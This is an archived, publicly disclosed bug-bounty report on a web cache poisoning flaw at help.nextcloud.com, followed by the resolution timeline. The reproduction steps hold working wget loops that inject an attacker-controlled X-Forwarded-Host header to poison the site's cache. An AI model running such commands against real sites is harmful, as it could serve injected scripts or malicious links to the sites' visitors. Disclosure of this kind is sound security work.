---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - trigger/social-engineering
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2020-01-31
submitted: 2018-10-27T19:33:02.896Z
bounty_usd: null
votes: 25
cve: []
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "g4mm4"
source: "https://hackerone.com/reports/429747"
title: "https://help.nextcloud.com::: Web cache poisoning attack"
---
# https://help.nextcloud.com::: Web cache poisoning attack

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 25 | **Program:** Nextcloud | **Disclosed:** 2020-01-31

- Report: [https://hackerone.com/reports/429747](https://hackerone.com/reports/429747)
- CWE: N/A
- Submitted: 2018-10-27T19:33:02.896Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi there,
I just found the website:
https://help.nextcloud.com
is infected with "Web cache poisoning"
Abuse this bug, Attacker can:
1. Poison your cache with HTTP header with XSS included. This attack may leads to Stored XSS
2. Poison your website contains malware url (cache poisoned by attacker), maybe the user's browser (like Firefox, Chrome) will block your website (https://help.nextcloud.com)

How to reproduce the issue:

    In the 1st terminal, run command likes this: 
$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
    In the 2nd terminal, run command below for confirmation this attack is successful: 
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done

Finally, this link bellow: https://help.nextcloud.com/?qwKzzSR=649227948379 was infected with "Web Cache poisoning attack".
Please see the attached image for details.

Impact
Stored XSS attack, deface website ....
Cheers,
~g4mm4

## Impact

Stored XSS attack, deface website, phishing for funs :)

## Timeline

- **Report Filed**
- **2018-10-27** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **Not Eligible For Bounty**
- **2018-10-29** @rullzer: Hi @g4mm4,

Thanks for your report.
We run discourse on help.nextcloud.com. Thus this is not eligible for a bounty.

I have forwarded this to our sysadmins.

Cheers
--Roeland
- **2018-10-29** @g4mm4: Hi Roeland,
I just reported this issue to Discourse. Hope to see they will apply patches soon to protect all their clients (including nextcloud) ;)
cheers,
~g4mm4
- **Report Triaged**
- **2018-11-16** @g4mm4: Hi there,
Discourse team has been fixed this issue and close my report (with bounty). But the client likes you ( nextcloud...) hasn't been patched so far. Perhaps you should directly contact Discourse team for more details :)
cheers,
~g4mm4
- **2019-01-04** @g4mm4: Just re-checked this issue, I confirmed this issue has been fixed :)
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
